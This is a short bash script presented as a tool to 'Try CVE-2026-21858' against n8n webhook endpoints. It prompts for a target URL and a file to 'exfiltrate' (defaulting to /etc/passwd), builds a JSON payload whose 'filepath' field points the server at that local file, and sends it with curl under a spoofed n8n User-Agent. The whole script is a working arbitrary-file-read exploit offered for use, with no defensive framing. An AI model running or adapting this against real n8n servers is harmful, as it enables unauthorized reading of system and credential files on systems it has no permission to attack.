#!/bin/bash

# Clear the screen for a clean "tool" look
clear
echo "=========================================="
echo "   Try CVE-2026-21858                     "
echo "=========================================="

# Prompt the user for the Target URL
# Default to localhost
read -p "[?] Enter Target URL (default: http://localhost:5678/webhook/test): " TARGET_URL
TARGET_URL=${TARGET_URL:-http://localhost:5678/webhook/test}

# Prompt the user for the file you want to reveal
read -p "[?] Enter File to Exfiltrate (default: /etc/passwd): " TARGET_FILE
TARGET_FILE=${TARGET_FILE:-/etc/passwd}

echo ""
echo "Constructing Payload..."

# Construct the JSON Payload
# 'field-0' is the standard key n8n assigns to the first binary input.
JSON_PAYLOAD=$(cat <<EOF
{
    "files": {
        "field-0": {
            "filepath": "$TARGET_FILE",
            "originalFilename": "$TARGET_FILE",
            "mimeType": "application/pdf",
            "extension": "pdf"
        }
    },
    "data": {
        "note": "exploit_attempt_v1"
    },
    "executionId": "manual_bash_trigger"
}
EOF
)

echo "Target: $TARGET_URL"
echo "Hunting for: $TARGET_FILE"
echo "Sending Request..."
echo "------------------------------------------"

# Execute the exploit
# -s = Silent (no progress bar)
# -v = Verbose (so you can see the headers/response)
curl -v -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -H "User-Agent: n8n/1.0" \
  -d "$JSON_PAYLOAD"

echo ""
echo "------------------------------------------"
echo "Request Complete."
